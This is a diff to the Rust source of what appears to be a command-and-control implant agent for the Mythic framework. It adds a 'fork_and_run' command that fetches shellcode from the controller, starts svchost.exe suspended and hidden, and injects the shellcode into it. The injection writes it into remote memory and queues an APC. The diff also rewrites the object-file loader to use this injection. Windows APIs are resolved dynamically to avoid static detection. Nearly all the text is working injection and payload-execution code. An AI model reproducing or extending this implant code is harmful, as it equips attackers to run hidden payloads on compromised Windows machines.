@@ -7,6 +7,7 @@ use std::result::Result;
 use std::sync::mpsc;
 
 const CHUNK_SIZE: usize = 512000;
+const MAX_OUTPUT: usize = 5 * 1024 * 1024; // 5MB cap
 
 #[derive(Serialize, Deserialize, Debug)]
 pub struct ExecuteAssemblyArgs {
@@ -21,6 +22,19 @@ pub struct BofArgs {
     pub bof_file_id: Option<String>,
     pub arguments: Option<String>,
 }
+
+#[derive(Serialize, Deserialize, Debug)]
+pub struct ForkRunArgs {
+    #[serde(rename = "shellcode-file-id")]
+    pub shellcode_file_id: Option<String>,
+    #[serde(default = "default_spawnto")]
+    pub spawnto: String,
+    #[serde(default = "default_timeout")]
+    pub timeout: u32,
+}
+
+fn default_spawnto() -> String { "C:\\Windows\\System32\\svchost.exe".to_string() }
+fn default_timeout() -> u32 { 30 }
 
 fn download_file_chunks(
     tx: &mpsc::Sender<serde_json::Value>,
@@ -50,6 +64,280 @@ fn download_file_chunks(
     Ok(data)
 }
 
+// ============================================================================
+// FORK AND RUN — Sacrificial process pattern
+// ============================================================================
+
+#[cfg(target_os = "windows")]
+unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) -> Result<String, String> {
+    use std::ptr;
+    use std::ffi::c_void;
+
+    type CreatePipeFn = unsafe extern "system" fn(*mut *mut c_void, *mut *mut c_void, *mut SecurityAttributes, u32) -> i32;
+    type CreateProcessAFn = unsafe extern "system" fn(*const u8, *mut u8, *mut c_void, *mut c_void, i32, u32, *mut c_void, *const u8, *mut StartupInfoA, *mut ProcessInformation) -> i32;
+    type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
+    type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u8, usize, *mut usize) -> i32;
+    type VirtualProtectExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
+    type QueueUserAPCFn = unsafe extern "system" fn(Option<unsafe extern "system" fn(usize)>, *mut c_void, usize) -> u32;
+    type ResumeThreadFn = unsafe extern "system" fn(*mut c_void) -> u32;
+    type ReadFileFn = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
+    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
+    type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
+    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    #[repr(C)]
+    struct SecurityAttributes {
+        length: u32,
+        security_descriptor: *mut c_void,
+        inherit_handle: i32,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    struct StartupInfoA {
+        cb: u32,
+        reserved: *mut u8,
+        desktop: *mut u8,
+        title: *mut u8,
+        x: u32, y: u32, x_size: u32, y_size: u32,
+        x_count_chars: u32, y_count_chars: u32,
+        fill_attribute: u32,
+        flags: u32,
+        show_window: u16,
+        cb_reserved2: u16,
+        lp_reserved2: *mut u8,
+        std_input: *mut c_void,
+        std_output: *mut c_void,
+        std_error: *mut c_void,
+    }
+
+    #[repr(C)]
+    #[derive(Default)]
+    struct ProcessInformation {
+        process: *mut c_void,
+        thread: *mut c_void,
+        process_id: u32,
+        thread_id: u32,
+    }
+
+    // Resolve APIs
+    let create_pipe: CreatePipeFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreatePipe").ok_or("CreatePipe")?);
+    let create_process: CreateProcessAFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreateProcessA").ok_or("CreateProcessA")?);
+    let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualAllocEx").ok_or("VirtualAllocEx")?);
+    let write_process_memory: WriteProcessMemoryFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WriteProcessMemory").ok_or("WriteProcessMemory")?);
+    let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtectEx").ok_or("VirtualProtectEx")?);
+    let queue_user_apc: QueueUserAPCFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "QueueUserAPC").ok_or("QueueUserAPC")?);
+    let resume_thread: ResumeThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ResumeThread").ok_or("ResumeThread")?);
+    let read_file: ReadFileFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ReadFile").ok_or("ReadFile")?);
+    let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject").ok_or("WaitForSingleObject")?);
+    let terminate_process: TerminateProcessFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "TerminateProcess").ok_or("TerminateProcess")?);
+    let close_handle: CloseHandleFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle").ok_or("CloseHandle")?);
+
+    // 1. Create pipe for stdout capture
+    let mut sa = SecurityAttributes { length: std::mem::size_of::<SecurityAttributes>() as u32, security_descriptor: ptr::null_mut(), inherit_handle: 1 };
+    let mut read_pipe: *mut c_void = ptr::null_mut();
+    let mut write_pipe: *mut c_void = ptr::null_mut();
+
+    if create_pipe(&mut read_pipe, &mut write_pipe, &mut sa, 0) == 0 {
+        return Err("CreatePipe failed".to_string());
+    }
+
+    // 2. Create suspended process
+    let spawnto_c = std::ffi::CString::new(spawnto).map_err(|_| "Invalid spawnto path")?;
+    let mut si: StartupInfoA = std::mem::zeroed();
+    si.cb = std::mem::size_of::<StartupInfoA>() as u32;
+    si.flags = 0x100; // STARTF_USESTDHANDLES
+    si.std_output = write_pipe;
+    si.std_error = write_pipe;
+    si.std_input = ptr::null_mut();
+
+    let mut pi: ProcessInformation = std::mem::zeroed();
+    let create_flags: u32 = 0x04 | 0x08000000; // CREATE_SUSPENDED | CREATE_NO_WINDOW
+
+    let result = create_process(
+        spawnto_c.as_ptr() as *const u8,
+        ptr::null_mut(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        1, // inherit handles
+        create_flags,
+        ptr::null_mut(),
+        ptr::null(),
+        &mut si,
+        &mut pi,
+    );
+
+    if result == 0 {
+        close_handle(read_pipe);
+        close_handle(write_pipe);
+        return Err("CreateProcess failed".to_string());
+    }
+
+    // 3. Allocate + write + protect in child
+    let remote_mem = virtual_alloc_ex(pi.process, ptr::null_mut(), shellcode.len(), 0x3000, 0x04); // MEM_COMMIT|RESERVE, PAGE_READWRITE
+    if remote_mem.is_null() {
+        terminate_process(pi.process, 1);
+        close_handle(pi.process);
+        close_handle(pi.thread);
+        close_handle(read_pipe);
+        close_handle(write_pipe);
+        return Err("VirtualAllocEx failed in child".to_string());
+    }
+
+    let mut written: usize = 0;
+    write_process_memory(pi.process, remote_mem, shellcode.as_ptr(), shellcode.len(), &mut written);
+
+    let mut old_protect: u32 = 0;
+    virtual_protect_ex(pi.process, remote_mem, shellcode.len(), 0x20, &mut old_protect); // PAGE_EXECUTE_READ
+
+    // 4. Queue APC + close write pipe (parent side) + resume
+    queue_user_apc(Some(std::mem::transmute(remote_mem)), pi.thread, 0);
+    close_handle(write_pipe); // parent closes write end BEFORE resume — triggers EOF when child exits
+
+    resume_thread(pi.thread);
+
+    // 5. Read stdout from pipe (blocks until child closes its end / dies)
+    let mut output = Vec::new();
+    let mut buf = [0u8; 4096];
+    loop {
+        let mut bytes_read: u32 = 0;
+        let ok = read_file(read_pipe, buf.as_mut_ptr(), buf.len() as u32, &mut bytes_read, ptr::null_mut());
+        if ok == 0 || bytes_read == 0 {
+            break;
+        }
+        output.extend_from_slice(&buf[..bytes_read as usize]);
+        if output.len() >= MAX_OUTPUT {
+            break;
+        }
+    }
+
+    // 6. Wait for child with timeout
+    let wait_result = wait_for_single_object(pi.process, timeout_ms * 1000);
+    if wait_result == 0x102 { // WAIT_TIMEOUT
+        terminate_process(pi.process, 1);
+    }
+
+    // Cleanup
+    close_handle(pi.process);
+    close_handle(pi.thread);
+    close_handle(read_pipe);
+
+    let output_str = String::from_utf8_lossy(&output).to_string();
+    if output_str.is_empty() {
+        Ok("Executed (no output captured)".to_string())
+    } else {
+        Ok(output_str)
+    }
+}
+
+// ============================================================================
+// FORK_AND_RUN COMMAND — shellcode in sacrificial process
+// ============================================================================
+
+#[cfg(target_os = "windows")]
+pub fn fork_and_run(
+    tx: &mpsc::Sender<serde_json::Value>,
+    rx: mpsc::Receiver<serde_json::Value>,
+) -> Result<(), Box<dyn Error>> {
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    let args: ForkRunArgs = serde_json::from_str(&task.parameters)?;
+    let file_id = args.shellcode_file_id.ok_or("No shellcode file ID")?;
+
+    let shellcode = download_file_chunks(tx, &rx, &file_id, &task.id)?;
+    if shellcode.is_empty() {
+        return Err("Shellcode is empty".into());
+    }
+
+    let sc_size = shellcode.len();
+    let result = unsafe { fork_and_run_impl(&shellcode, &args.spawnto, args.timeout) };
+
+    match result {
+        Ok(output) => tx.send(mythic_success!(task.id, format!("fork_and_run ({} bytes → {})\n\n{}", sc_size, args.spawnto, output)))?,
+        Err(e) => tx.send(mythic_error!(task.id, format!("fork_and_run failed: {}", e)))?,
+    }
+    Ok(())
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn fork_and_run(
+    tx: &mpsc::Sender<serde_json::Value>,
+    rx: mpsc::Receiver<serde_json::Value>,
+) -> Result<(), Box<dyn Error>> {
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    tx.send(mythic_error!(task.id, "fork_and_run requires Windows"))?;
+    Ok(())
+}
+
+// ============================================================================
+// BOF COMMAND — now uses fork-and-run (agent-safe)
+// ============================================================================
+
+#[cfg(target_os = "windows")]
+pub fn bof(
+    tx: &mpsc::Sender<serde_json::Value>,
+    rx: mpsc::Receiver<serde_json::Value>,
+) -> Result<(), Box<dyn Error>> {
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    let args: BofArgs = serde_json::from_str(&task.parameters)?;
+    let file_id = args.bof_file_id.ok_or("No BOF file ID")?;
+    let arguments = args.arguments.unwrap_or_default();
+
+    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
+    if file_data.is_empty() {
+        return Err("BOF file is empty".into());
+    }
+
+    let bof_size = file_data.len();
+
+    // Parse COFF to extract .text section
+    let text_offset = match find_coff_text_section(&file_data) {
+        Some(offset) => offset,
+        None => {
+            tx.send(mythic_error!(task.id, format!(
+                "BOF ({} bytes): invalid COFF - could not find .text section",
+                bof_size
+            )))?;
+            return Ok(());
+        }
+    };
+
+    // Get .text section size from section header
+    let text_size = get_coff_text_size(&file_data, text_offset).unwrap_or(file_data.len() - text_offset);
+    let text_end = (text_offset + text_size).min(file_data.len());
+    let text_data = &file_data[text_offset..text_end];
+
+    if text_data.is_empty() {
+        tx.send(mythic_error!(task.id, "BOF .text section is empty"))?;
+        return Ok(());
+    }
+
+    // Execute via fork-and-run (sacrificial process — agent-safe)
+    let result = unsafe { fork_and_run_impl(text_data, "C:\\Windows\\System32\\svchost.exe", 30) };
+
+    match result {
+        Ok(output) => tx.send(mythic_success!(task.id, format!(
+            "BOF executed ({} bytes, .text {} bytes) via fork-and-run\n\n{}",
+            bof_size, text_data.len(), output
+        )))?,
+        Err(e) => tx.send(mythic_error!(task.id, format!("BOF fork-and-run failed: {}", e)))?,
+    }
+    Ok(())
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn bof(
+    tx: &mpsc::Sender<serde_json::Value>,
+    rx: mpsc::Receiver<serde_json::Value>,
+) -> Result<(), Box<dyn Error>> {
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    tx.send(mythic_error!(task.id, "bof requires Windows"))?;
+    Ok(())
+}
+
+// ============================================================================
+// EXECUTE_ASSEMBLY — unchanged
+// ============================================================================
+
 #[cfg(target_os = "windows")]
 pub fn execute_assembly(
     tx: &mpsc::Sender<serde_json::Value>,
@@ -65,15 +353,11 @@ pub fn execute_assembly(
         return Err("Assembly file is empty".into());
     }
 
-    // Write assembly to temp with random name (no extension to reduce AV signature matches)
     let temp_dir = std::env::temp_dir();
     let rand_name: String = (0..8).map(|_| (b'a' + (rand::random::<u8>() % 26)) as char).collect();
     let asm_path = temp_dir.join(&rand_name);
     std::fs::write(&asm_path, &file_data)?;
 
-    // Use dotnet exec or direct .NET hosting via a minimal C# snippet compiled inline
-    // Actually, the cleanest OPSEC approach: use rundll32 + .NET COM hosting
-    // But simplest reliable approach without powershell: use `dotnet` CLI if available
     let asm_path_str = asm_path.to_string_lossy().to_string();
 
     let output = std::process::Command::new("dotnet")
@@ -86,19 +370,18 @@ pub fn execute_assembly(
             let stdout = String::from_utf8_lossy(&out.stdout);
             let stderr = String::from_utf8_lossy(&out.stderr);
             if stderr.is_empty() {
-                format!("Assembly executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
+                format!("Executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
             } else {
-                format!("Assembly executed ({} bytes)\n\nOutput:\n{}\n\nErrors:\n{}", file_data.len(), stdout.trim(), stderr.trim())
+                format!("Executed ({} bytes)\n\nOutput:\n{}\n\nErrors:\n{}", file_data.len(), stdout.trim(), stderr.trim())
             }
         }
         Err(_) => {
-            // Fallback: try executing as a standard exe
             match std::process::Command::new(&asm_path_str).args(arguments.split_whitespace()).output() {
                 Ok(out) => {
                     let stdout = String::from_utf8_lossy(&out.stdout);
                     format!("Executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
                 }
-                Err(e) => format!("Execution failed: {}. dotnet runtime not available.", e),
+                Err(e) => format!("Execution failed: {}", e),
             }
         }
     };
@@ -114,232 +397,68 @@ pub fn execute_assembly(
     rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_error!(task.id, "execute_assembly is only supported on Windows".to_string()))?;
+    tx.send(mythic_error!(task.id, "execute_assembly requires Windows"))?;
     Ok(())
 }
 
-#[cfg(target_os = "windows")]
-pub fn bof(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    use std::ptr;
+// ============================================================================
+// COFF PARSER HELPERS
+// ============================================================================
 
-    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    let args: BofArgs = serde_json::from_str(&task.parameters)?;
-    let file_id = args.bof_file_id.ok_or("No BOF file ID")?;
-    let arguments = args.arguments.unwrap_or_default();
-
-    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
-    if file_data.is_empty() {
-        return Err("BOF file is empty".into());
-    }
-
-    let bof_size = file_data.len();
-
-    // Parse COFF header to find .text section and go() entry point
-    let text_offset = match find_coff_text_section(&file_data) {
-        Some(offset) => offset,
-        None => {
-            tx.send(mythic_error!(task.id, format!(
-                "BOF ({} bytes): invalid COFF format - could not locate .text section. Ensure file is a valid x64 COFF object.",
-                bof_size
-            )))?;
-            return Ok(());
-        }
-    };
-
-    let text_data = &file_data[text_offset..];
-    let text_size = text_data.len();
-
-    if text_size == 0 {
-        tx.send(mythic_error!(task.id, "BOF .text section is empty"))?;
-        return Ok(());
-    }
-
-    unsafe {
-        // Type definitions for dynamically resolved functions
-        type VirtualAllocFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
-        type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
-        type VirtualFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
-        type CreateThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
-        type WaitForSingleObjectFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
-        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
-
-        // Dynamically resolve APIs
-        let virtual_alloc: VirtualAllocFn = std::mem::transmute(
-            crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
-                .ok_or("VirtualAlloc resolve failed")?
-        );
-        let virtual_protect: VirtualProtectFn = std::mem::transmute(
-            crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
-                .ok_or("VirtualProtect resolve failed")?
-        );
-        let virtual_free: VirtualFreeFn = std::mem::transmute(
-            crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
-                .ok_or("VirtualFree resolve failed")?
-        );
-        let create_thread: CreateThreadFn = std::mem::transmute(
-            crate::winapi_resolve::resolve("kernel32.dll", "CreateThread")
-                .ok_or("CreateThread resolve failed")?
-        );
-        let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(
-            crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject")
-                .ok_or("WaitForSingleObject resolve failed")?
-        );
-        let close_handle: CloseHandleFn = std::mem::transmute(
-            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
-                .ok_or("CloseHandle resolve failed")?
-        );
-
-        // Use numeric constants instead of named winapi constants
-        const MEM_COMMIT: u32 = 0x1000;
-        const MEM_RESERVE: u32 = 0x2000;
-        const MEM_RELEASE: u32 = 0x8000;
-        const PAGE_READWRITE: u32 = 0x04;
-        const PAGE_EXECUTE_READ: u32 = 0x20;
-
-        let mem = virtual_alloc(ptr::null_mut(), text_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if mem.is_null() {
-            tx.send(mythic_error!(task.id, "Memory allocation failed for BOF"))?;
-            return Ok(());
-        }
-
-        ptr::copy_nonoverlapping(text_data.as_ptr(), mem as *mut u8, text_size);
-
-        let mut old_protect: u32 = 0;
-        if virtual_protect(mem, text_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
-            virtual_free(mem, 0, MEM_RELEASE);
-            tx.send(mythic_error!(task.id, "Memory protection change failed for BOF"))?;
-            return Ok(());
-        }
-
-        let arg_bytes = arguments.as_bytes();
-        let arg_mem = if !arg_bytes.is_empty() {
-            let a = virtual_alloc(ptr::null_mut(), arg_bytes.len() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            if !a.is_null() {
-                ptr::copy_nonoverlapping(arg_bytes.as_ptr(), a as *mut u8, arg_bytes.len());
-                *((a as *mut u8).add(arg_bytes.len())) = 0;
-            }
-            a
-        } else {
-            ptr::null_mut()
-        };
-
-        let mut thread_id: u32 = 0;
-        let thread = create_thread(
-            ptr::null_mut(),
-            0,
-            Some(std::mem::transmute(mem)),
-            arg_mem,
-            0,
-            &mut thread_id,
-        );
-
-        if thread.is_null() {
-            virtual_free(mem, 0, MEM_RELEASE);
-            if !arg_mem.is_null() { virtual_free(arg_mem, 0, MEM_RELEASE); }
-            tx.send(mythic_error!(task.id, "Thread creation failed for BOF"))?;
-            return Ok(());
-        }
-
-        // Wait up to 30 seconds
-        let wait = wait_for_single_object(thread, 30000);
-        close_handle(thread);
-
-        virtual_free(mem, 0, MEM_RELEASE);
-        if !arg_mem.is_null() { virtual_free(arg_mem, 0, MEM_RELEASE); }
-
-        let status = if wait == 0 { "completed" } else { "timed out (30s)" };
-        tx.send(mythic_success!(task.id, format!(
-            "BOF executed ({} bytes, .text at offset 0x{:X}, {} code bytes), status: {}",
-            bof_size, text_offset, text_size, status
-        )))?;
-    }
-
-    Ok(())
-}
-
-// Minimal COFF parser: find the .text section offset
-// COFF header: 20 bytes (IMAGE_FILE_HEADER)
-//   offset 0: Machine (u16)
-//   offset 2: NumberOfSections (u16)
-//   offset 16: SizeOfOptionalHeader (u16)
-// Section headers follow at offset 20 + SizeOfOptionalHeader, each 40 bytes:
-//   offset 0: Name (8 bytes)
-//   offset 20: SizeOfRawData (u32)
-//   offset 24: PointerToRawData (u32)
 #[cfg(target_os = "windows")]
 fn find_coff_text_section(data: &[u8]) -> Option<usize> {
-    if data.len() < 20 {
-        return None;
-    }
+    if data.len() < 20 { return None; }
 
     let machine = u16::from_le_bytes([data[0], data[1]]);
-    // 0x8664 = AMD64, 0x14C = i386
-    if machine != 0x8664 && machine != 0x014C {
-        return None;
-    }
+    if machine != 0x8664 && machine != 0x014C { return None; }
 
     let num_sections = u16::from_le_bytes([data[2], data[3]]) as usize;
-    if num_sections == 0 || num_sections > 96 {
-        return None;
-    }
-    let optional_header_size = u16::from_le_bytes([data[16], data[17]]) as usize;
-    let section_table_offset = 20usize.saturating_add(optional_header_size);
+    if num_sections == 0 || num_sections > 96 { return None; }
 
-    let required = section_table_offset.saturating_add(num_sections.saturating_mul(40));
-    if data.len() < required || required == 0 {
-        return None;
-    }
+    let opt_hdr_size = u16::from_le_bytes([data[16], data[17]]) as usize;
+    let sec_table = 20usize.saturating_add(opt_hdr_size);
+    let required = sec_table.saturating_add(num_sections.saturating_mul(40));
+    if data.len() < required { return None; }
 
     for i in 0..num_sections {
-        let sec_offset = section_table_offset + (i * 40);
-        let name = &data[sec_offset..sec_offset + 8];
+        let off = sec_table + (i * 40);
+        let name = &data[off..off + 8];
+        let raw_ptr = u32::from_le_bytes([data[off+20], data[off+21], data[off+22], data[off+23]]) as usize;
 
-        // Look for .text section
-        if name.starts_with(b".text\0") || name.starts_with(b".text\x00") {
-            let raw_data_ptr = u32::from_le_bytes([
-                data[sec_offset + 20], data[sec_offset + 21],
-                data[sec_offset + 22], data[sec_offset + 23],
-            ]) as usize;
-
-            if raw_data_ptr > 0 && raw_data_ptr < data.len() {
-                return Some(raw_data_ptr);
-            }
+        if name.starts_with(b".text\0") && raw_ptr > 0 && raw_ptr < data.len() {
+            return Some(raw_ptr);
         }
     }
 
-    // Fallback: if no .text found, try first section with executable characteristics
+    // Fallback: first executable section
     for i in 0..num_sections {
-        let sec_offset = section_table_offset + (i * 40);
-        let characteristics = u32::from_le_bytes([
-            data[sec_offset + 36], data[sec_offset + 37],
-            data[sec_offset + 38], data[sec_offset + 39],
-        ]);
+        let off = sec_table + (i * 40);
+        let chars = u32::from_le_bytes([data[off+36], data[off+37], data[off+38], data[off+39]]);
+        let raw_ptr = u32::from_le_bytes([data[off+20], data[off+21], data[off+22], data[off+23]]) as usize;
 
-        // IMAGE_SCN_MEM_EXECUTE = 0x20000000, IMAGE_SCN_CNT_CODE = 0x20
-        if (characteristics & 0x20000020) != 0 {
-            let raw_data_ptr = u32::from_le_bytes([
-                data[sec_offset + 20], data[sec_offset + 21],
-                data[sec_offset + 22], data[sec_offset + 23],
-            ]) as usize;
-
-            if raw_data_ptr > 0 && raw_data_ptr < data.len() {
-                return Some(raw_data_ptr);
-            }
+        if (chars & 0x20000020) != 0 && raw_ptr > 0 && raw_ptr < data.len() {
+            return Some(raw_ptr);
         }
     }
-
     None
 }
 
-#[cfg(not(target_os = "windows"))]
-pub fn bof(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_error!(task.id, "bof is only supported on Windows".to_string()))?;
-    Ok(())
+#[cfg(target_os = "windows")]
+fn get_coff_text_size(data: &[u8], text_offset: usize) -> Option<usize> {
+    if data.len() < 20 { return None; }
+
+    let num_sections = u16::from_le_bytes([data[2], data[3]]) as usize;
+    let opt_hdr_size = u16::from_le_bytes([data[16], data[17]]) as usize;
+    let sec_table = 20 + opt_hdr_size;
+
+    for i in 0..num_sections {
+        let off = sec_table + (i * 40);
+        if off + 24 > data.len() { break; }
+        let raw_ptr = u32::from_le_bytes([data[off+20], data[off+21], data[off+22], data[off+23]]) as usize;
+        if raw_ptr == text_offset {
+            let size = u32::from_le_bytes([data[off+16], data[off+17], data[off+18], data[off+19]]) as usize;
+            return Some(size);
+        }
+    }
+    None
 }
